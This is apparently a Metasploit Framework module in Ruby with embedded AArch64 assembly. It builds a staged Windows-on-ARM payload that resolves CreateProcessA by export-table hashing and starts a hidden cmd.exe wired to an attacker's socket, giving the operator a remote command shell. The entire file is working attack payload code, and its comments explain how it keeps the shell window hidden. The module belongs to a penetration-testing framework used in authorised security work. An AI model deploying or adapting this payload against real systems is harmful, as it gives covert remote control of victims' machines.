# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Windows
  include Msf::Payload::Windows::Aarch64
  include Msf::Payload::Windows::Exitfunk_Aarch64
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Windows AArch64 Command Shell',
        'Description' => %q{
          Spawn a piped command shell on Windows on ARM (AArch64) (staged).
          Expects an open TCP socket handle in x0 at entry (convention sockx0).
          Resolves CreateProcessA via PEB / Export Address Table hashing and
          launches cmd.exe with stdin/stdout/stderr redirected to the socket
          via STARTF_USESTDHANDLES.
        },
        'Author' => [ 'vinicius-batistella' ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_AARCH64,
        'Session' => Msf::Sessions::CommandShellWindows,
        'PayloadCompat' => {
          'Convention' => 'sockx0'
        },
        'Stage' => {
          'Payload' => ''
        }
      )
    )
  end

  def generate_stage(_opts = {})
    asm = build_stage_asm(exitfunk: datastore['EXITFUNC'])
    compile_aarch64(asm)
  end

  private

  def build_stage_asm(exitfunk:)
    asm = <<~ASM
      main:
        mov     x22, x0
        sub     sp, sp, #0x100
        mov     x29, sp
    ASM
    asm += asm_block_api_aarch64
    asm += <<~ASM
      resolve_symbols_kernel32:
        str     x3, [x29, #0x00]
        movz    w0, #0xfe72
        movk    w0, #0x16b3, lsl #16
        ldr     x9, [x29, #0x08]
        blr     x9
        str     x0, [x29, #0x40]
      build_PROCESS_INFORMATION_and_STARTUPINFOA:
        sub     sp, sp, #0xB0
        add     x10, sp, #0x10
        add     x11, sp, #0x30
        add     x12, sp, #0xA0
        stp     xzr, xzr, [x10]
        str     xzr, [x10, #16]
        stp     xzr, xzr, [x11, #0x00]
        stp     xzr, xzr, [x11, #0x10]
        stp     xzr, xzr, [x11, #0x20]
        stp     xzr, xzr, [x11, #0x30]
        stp     xzr, xzr, [x11, #0x40]
        stp     xzr, xzr, [x11, #0x50]
        str     xzr,      [x11, #0x60]
        mov     w0, #0x68
        str     w0, [x11, #0x00]
        // STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; wShowWindow stays 0 (SW_HIDE)
        mov     w0, #0x101
        str     w0, [x11, #0x3C]
        str     x22, [x11, #0x50]
        str     x22, [x11, #0x58]
        str     x22, [x11, #0x60]
        movz    x0, #0x6D63
        movk    x0, #0x2E64, lsl #16
        movk    x0, #0x7865, lsl #32
        movk    x0, #0x0065, lsl #48
        str     x0, [x12]
      call_CreateProcessA:
        mov     x0, xzr
        mov     x1, x12
        mov     x2, xzr
        mov     x3, xzr
        mov     w4, #1
        // CREATE_NO_WINDOW — hides cmd/conhost on modern Windows (0x101 alone is not enough)
        movz    w5, #0x0800, lsl #16
        mov     x6, xzr
        mov     x7, xzr
        stp     x11, x10, [sp]
        ldr     x9, [x29, #0x40]
        blr     x9
        add     sp, sp, #0xB0
    ASM
    asm + asm_exitfunk_aarch64(exitfunk: exitfunk)
  end
end
